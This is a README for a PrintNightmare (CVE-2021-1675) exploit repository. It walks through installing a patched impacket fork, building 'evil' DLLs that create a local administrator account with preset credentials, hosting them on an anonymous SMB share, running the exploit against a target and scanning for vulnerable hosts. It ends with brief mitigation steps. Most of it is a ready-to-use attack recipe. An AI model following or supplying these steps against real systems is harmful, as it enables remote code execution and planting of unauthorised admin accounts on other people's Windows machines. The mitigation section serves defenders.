# CVE-2021-1675

Stolen from: https://github.com/cube0x0/CVE-2021-1675

### Install

```
pip3 uninstall impacket
git clone --branch PrintNightmare https://github.com/LuemmelSec/impacket
cd impacket
python3 -m pip install .
apt install mingw-w64
```

### Build DLL (64 bit)
I used this version: https://github.com/newsoft/adduser  

You can use the evil32.dll or evil64.dll under ./DLL
Username: PWND  
Password: B@dPass123!

Or build your own:  
```
cd DLL  
cp Tchar.h /usr/x86_64-w64-mingw32/include/
cp Lmaccess.h /usr/x86_64-w64-mingw32/include/
cp Tchar.h /usr/i686-w64-mingw32/include
cp Lmaccess.h /usr/i686-w64-mingw32/include/
```

Edit the evil.dll to your needs:  
- change username & password  
- change name of the local admin group -> language dependant  

Build the DLL  64 bit:  
```
x86_64-w64-mingw32-gcc -shared -oevil64.dll evil.c -lnetapi32
cp evil64.dll /tmp/
```

Build the DLL 32 bit:  
```
i686-w64-mingw32-gcc -shared -oevil32.dll evil.c -lnetapi32
cp evil32.dll /tmp/
```

### SMB configuration

Easiest way to host payloads is to use samba and modify `/etc/samba/smb.conf   ` to allow anonymous access

```
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
    force user = smbuser
```

Start SMB Service
```
service smbd start
```

### exploit.py

```
python3 exploit.py mcafeelab.local/lowpriv@10.55.0.1 '\\10.55.0.30\smb\evil64.dll'
```


### Scanning

We can use `rpcdump.py` from impacket to scan for vulnerable hosts, if it returns a value, it's vulnerable 

```
rpcdump.py @192.168.1.10 | grep MS-RPRN

Protocol: [MS-RPRN]: Print System Remote Protocol
```

### Mitigation

https://doublepulsar.com/zero-day-for-every-supported-windows-os-version-in-the-wild-printnightmare-b3fdb82f840c  

Disable Spooler service

```powershell
Stop-Service Spooler
REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start " /t REG_DWORD /d "4" /f
```

Or Uninstall Print-Services

```powershell
Uninstall-WindowsFeature Print-Services
```
